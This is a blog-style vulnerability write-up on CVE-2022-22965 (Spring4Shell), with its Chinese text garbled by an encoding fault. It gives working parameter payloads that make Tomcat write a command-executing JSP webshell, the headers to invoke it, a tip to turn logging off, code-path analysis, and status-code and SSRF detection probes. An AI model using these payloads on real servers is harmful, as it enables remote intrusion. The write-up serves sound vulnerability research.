<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>CVE-2022-22965æ¼æ´è®°å½• | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="æ¼æ´æ—¶é—´çº¿
CVE-2010-1622 Springç¬¬ä¸€æ¬¡çˆ†å‘æ¼æ´ï¼ŒåŒæ—¶ä¹Ÿå½±å“äº†Struts(S2-020/S2-021/S2-022)

2017å¹´9æœˆ10æ—¥ Oracleå®˜æ–¹å‘æ–‡è§£é‡ŠJava 9çš„moduleæ–°ç‰¹æ€§

2022å¹´3æœˆ29æ—¥ èš‚èšé›†å›¢æŠ¥å‘Šæ¼æ´ï¼ˆCVE-2022-22965ï¼‰


POC
CVE-2010-1622/Struts(S2-020/S2-021/S2-022)
class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
class.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di
CVE-2022-22965åœ¨Java9æ–°å¢äº†moduleä¹‹å:
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di
ç„¶åè®¿é—®webshellçš„æ—¶å€™ï¼Œé™¤äº†æä¾›cmdçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®¾ç½®headerå¤´ï¼š
headers &amp;#x3D; &amp;#123;&amp;quot;suffix&amp;quot;:&amp;quot;%&amp;gt;&amp;#x2F;&amp;#x2F;&amp;quot;,
            &amp;quot;c1&amp;quot;:&amp;quot;Runtime&amp;quot;,
            &amp;quot;c2&amp;quot;:&amp;quot;&amp;lt;%&amp;quot;,
            &amp;quot;DNT&amp;quot;:&amp;quot;1&amp;quot;,
            &amp;quot;Content-Type&amp;quot;:&amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;
&amp;#125;

åˆ©ç”¨æ¡ä»¶
Javaç‰ˆæœ¬&amp;gt;=JDK9 
Spirngè¿è¡Œåœ¨Tomcatç¯å¢ƒä¸‹ï¼Œä»¥WaråŒ…éƒ¨ç½²(JaråŒ…çš„æ—¶å€™ä¸å­˜åœ¨)
æ–¹æ³•å…¥å‚æ˜¯éåŸºç¡€ç±»ï¼Œä¸èƒ½æ˜¯Stringï¼Œintç­‰
æ¥å£ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š

æ³¨æ„äº‹é¡¹
å¦‚æœè¦å¤šæ¬¡å†™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹fileDateFormatå±æ€§ï¼Œæœ€ç»ˆä¼šæ‹¼æ¥åˆ°æ–‡ä»¶åç¼€é‡Œé¢
åˆ©ç”¨æ—¥å¿—å†™å…¥shellçš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶ä¼šä¸æ–­å†™å…¥ï¼Œå¯ä»¥å…³é—­æ—¥å¿—è®°å½•: class.module.classLoader.resources.context.parent.pipeline.first.enabled=false

æ¼æ´åˆ†æå½“Content-Typeæ˜¯application/x-www-form-urlencodedçš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ServletModelAttributeMethodProcessorè§£æè¯·æ±‚ï¼Œç„¶åè¿›å…¥å‚æ•°ç»‘å®š:org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request):æ­¤æ—¶çš„mpvä¿å­˜äº†è¯·æ±‚é‡Œé¢çš„key-valueå‚æ•°ï¼Œæ¥ç€è¿›å…¥org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)å¯¹è·å–åˆ°çš„mpvsè¿›è¡Œåˆæ­¥æ ¡éªŒï¼š"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="CVE-2022-22965æ¼æ´è®°å½•"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> CVE-2022-22965æ¼æ´è®°å½•</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="æ¼æ´æ—¶é—´çº¿"><a href="#æ¼æ´æ—¶é—´çº¿" class="headerlink" title="æ¼æ´æ—¶é—´çº¿"></a>æ¼æ´æ—¶é—´çº¿</h2><ul>
<li><p>CVE-2010-1622 Springç¬¬ä¸€æ¬¡<a target="_blank" rel="noopener" href="https://www.inbreak.net/archives/377">çˆ†å‘æ¼æ´</a>ï¼ŒåŒæ—¶ä¹Ÿå½±å“äº†Struts(<a target="_blank" rel="noopener" href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p>
</li>
<li><p>2017å¹´9æœˆ10æ—¥ Oracleå®˜æ–¹å‘æ–‡è§£é‡ŠJava 9çš„moduleæ–°ç‰¹æ€§</p>
</li>
<li><p>2022å¹´3æœˆ29æ—¥ èš‚èšé›†å›¢æŠ¥å‘Šæ¼æ´ï¼ˆCVE-2022-22965ï¼‰</p>
</li>
</ul>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul>
<li><p>CVE-2010-1622/Struts(<a target="_blank" rel="noopener" href="https://su18.org/post/struts2-2/#s2-020s2-021s2-022">S2-020/S2-021/S2-022</a>)</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT
<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell
<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp
<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span>
<span class="token keyword">class</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>CVE-2022-22965åœ¨Java9æ–°å¢äº†moduleä¹‹å:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>directory<span class="token operator">=</span>webapps<span class="token operator">/</span>ROOT
<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>prefix<span class="token operator">=</span>shell
<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>suffix<span class="token operator">=</span><span class="token punctuation">.</span>jsp
<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>fileDateFormat<span class="token operator">=</span><span class="token number">1</span>
<span class="token keyword">class</span><span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc2<span class="token operator">%</span><span class="token number">7D</span>i<span class="token operator">%</span><span class="token function">20if</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>j<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span><span class="token number">20</span>in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åè®¿é—®webshellçš„æ—¶å€™ï¼Œé™¤äº†æä¾›cmdçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®¾ç½®headerå¤´ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">headers &#x3D; &#123;&quot;suffix&quot;:&quot;%&gt;&#x2F;&#x2F;&quot;,
            &quot;c1&quot;:&quot;Runtime&quot;,
            &quot;c2&quot;:&quot;&lt;%&quot;,
            &quot;DNT&quot;:&quot;1&quot;,
            &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul>
<li>Javaç‰ˆæœ¬&gt;=JDK9 </li>
<li>Spirngè¿è¡Œåœ¨Tomcatç¯å¢ƒä¸‹ï¼Œä»¥WaråŒ…éƒ¨ç½²(JaråŒ…çš„æ—¶å€™ä¸å­˜åœ¨)</li>
<li>æ–¹æ³•å…¥å‚æ˜¯éåŸºç¡€ç±»ï¼Œä¸èƒ½æ˜¯Stringï¼Œintç­‰</li>
<li>æ¥å£ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š</li>
</ul>
<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul>
<li>å¦‚æœè¦å¤šæ¬¡å†™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹fileDateFormatå±æ€§ï¼Œæœ€ç»ˆä¼šæ‹¼æ¥åˆ°æ–‡ä»¶åç¼€é‡Œé¢</li>
<li>åˆ©ç”¨æ—¥å¿—å†™å…¥shellçš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶ä¼šä¸æ–­å†™å…¥ï¼Œå¯ä»¥å…³é—­æ—¥å¿—è®°å½•: <code>class.module.classLoader.resources.context.parent.pipeline.first.enabled=false</code></li>
</ul>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å½“Content-Typeæ˜¯<code>application/x-www-form-urlencoded</code>çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>ServletModelAttributeMethodProcessor</code>è§£æè¯·æ±‚ï¼Œç„¶åè¿›å…¥å‚æ•°ç»‘å®š:<code>org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)</code>:<br><img src="/2022/04/06/CVE-2022-22965/3.png"><br>æ­¤æ—¶çš„mpvä¿å­˜äº†è¯·æ±‚é‡Œé¢çš„key-valueå‚æ•°ï¼Œæ¥ç€è¿›å…¥<code>org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)</code>å¯¹è·å–åˆ°çš„<code>mpvs</code>è¿›è¡Œåˆæ­¥æ ¡éªŒï¼š<br><img src="/2022/04/06/CVE-2022-22965/4.png"></p>
<p>å°†mpvsç»‘å®šåˆ°beanå¯¹è±¡ä¸Š<code>setPropertyValues</code>:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractPropertyAccessor</span>#<span class="token function">setPropertyValues</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>PropertyValues</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2022/04/06/CVE-2022-22965/5.png"></p>
<p>ç„¶åè¿›å…¥åˆ°<code>setPropertyValue</code></p>
<pre class="line-numbers language-none"><code class="language-none">org.springframework.beans.AbstractNestablePropertyAccessor#setPropertyValue(org.springframework.beans.PropertyValue)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿›å…¥åˆ°: <code>getPropertyAccessorForPropertyPath</code>:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractNestablePropertyAccessor</span>#<span class="token function">getPropertyAccessorForPropertyPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> propertyPath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªæ—¶å€™<code>propertyPath</code>æ˜¯httpè¯·æ±‚é‡Œé¢æ³¨å…¥çš„å˜é‡: <code>class.module.classLoader.resources.context.parent.appBase</code>ï¼Œæ­¤æ—¶å¯¹å˜é‡è¿›è¡Œåˆ†å‰²ï¼Œè·å–ç¬¬ä¸€ä¸ªclassçš„åç§»é‡ï¼Œåˆ°æœ€åéƒ½ä¼šè¿›å…¥åˆ°<code>org.springframework.beans.CachedIntrospectionResults#CachedIntrospectionResults</code>é‡Œé¢è¿›è¡ŒéªŒè¯ï¼Œè¿™é‡Œæ˜¯åˆ¤æ–­å½“è·å–åˆ°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªClassè€Œåˆè·å–ClassLoaderå±æ€§ï¼Œåˆ™ç›´æ¥è·³è¿‡ã€‚<br><img src="/2022/04/06/CVE-2022-22965/8.png"></p>
<p>Strutså‡ºç°æ¼æ´çš„æ—¶å€™ï¼Œæœ‰å¸ˆå‚…å†™è¿‡<a target="_blank" rel="noopener" href="https://cs.github.com/julianvilas/rooted2k15/blob/a00055f906502dd038b908a84907b74b38e26b20/struts-tester/struts-tester.jsp">jspè·å–å¯ç”¨çš„ç¯å¢ƒå˜é‡</a>çš„è„šæœ¬ï¼Œå¯ä»¥è·å–å¯ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå˜é‡ã€‚</p>
<p>ä»£ç å®¡è®¡phith0nå¸ˆå‚…å¯¹æ¼æ´çš„æ€»ç»“ï¼š</p>
<blockquote>
<p>åœ¨Javaé‡Œé¢ï¼Œæ‰€æœ‰çš„Javaå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>getClass()</code>æ–¹æ³•ï¼Œè·å–å¯¹è±¡çš„Classï¼ŒClassåˆæœ‰<code>getClassLoader()</code>æ–¹æ³•è·å–Classçš„<code>ClassLoader</code>ï¼Œè€Œåœ¨Tomcatä¸­ï¼Œä¸€äº›å’ŒTomcatçš„å…¨å±€é…ç½®ç›¸å…³çš„å±æ€§éƒ½ä¿å­˜åœ¨<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>è¿™ä¸ªTomcatä¸“å±çš„ClassLoaderçš„ä¸€äº›å±æ€§ã€å­å­™å±æ€§é‡Œã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡person.getClass().getClassLoader().getXXX()æ¥è°ƒç”¨ParallelWebappClassLoaderä¸­çš„ä¸€äº›æ•æ„Ÿå±æ€§æœ€åé€šè¿‡ä¿®æ”¹Tomcatçš„é…ç½®æ¥æ‰§è¡Œå±é™©æ“ä½œã€‚è¿™ä¸ªè°ƒç”¨é“¾æ”¾åœ¨ç”¨æˆ·æ•°æ®åŒ…é‡Œå°±æ˜¯class.classLoader.XXX</p>
</blockquote>
<h2 id="æ¼æ´åˆ¤æ–­"><a href="#æ¼æ´åˆ¤æ–­" class="headerlink" title="æ¼æ´åˆ¤æ–­"></a>æ¼æ´åˆ¤æ–­</h2><h4 id="æ ¹æ®çŠ¶æ€ç "><a href="#æ ¹æ®çŠ¶æ€ç " class="headerlink" title="æ ¹æ®çŠ¶æ€ç "></a>æ ¹æ®çŠ¶æ€ç </h4><ul>
<li>è¿”å›500: <code>class.module.class.module.classLoader.xx</code></li>
<li>è¿”å›400: <code>class.module.classLoader.DefaultAssertionStatus=nonsense</code></li>
<li>è¿”å›302: <code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code></li>
</ul>
<p>è¿”å›302çš„æ—¶å€™éœ€è¦åŒæ—¶æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶:</p>
<ol>
<li>è¯·æ±‚è·¯å¾„ä¸èƒ½ä»¥<code>/</code>ç»“å°¾</li>
<li>contextçš„<code>mapperDirectoryRedirectEnabled</code>å±æ€§ä¸ºtrue</li>
<li>è®¿é—®çš„åœ°å€æ˜¯å­˜åœ¨çš„ä¸€ä¸ªç›®å½•</li>
</ol>
<p>å½“<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=false</code>çš„æ—¶å€™ï¼Œè®¿é—®ä¸€ä¸ªå­˜åœ¨çš„ç›®å½•æ˜¯404ï¼š<br><img src="/2022/04/06/CVE-2022-22965/1.png"><br>å½“<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code>ï¼š<br><img src="/2022/04/06/CVE-2022-22965/2.png"></p>
<h4 id="é€šè¿‡SSRF"><a href="#é€šè¿‡SSRF" class="headerlink" title="é€šè¿‡SSRF"></a>é€šè¿‡SSRF</h4><p>ä¸æ¨èä½¿ç”¨ï¼Œå¦‚æœåº”ç”¨ä½¿ç”¨äº†<code>configFile</code>ä¼šç ´åè¿è¡Œç¯å¢ƒï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.configFile&#x3D;https:&#x2F;&#x2F;&#123;&#123;interactsh-url&#125;&#125;&amp;class.module.classLoader.resources.context.configFile.content.aaa&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

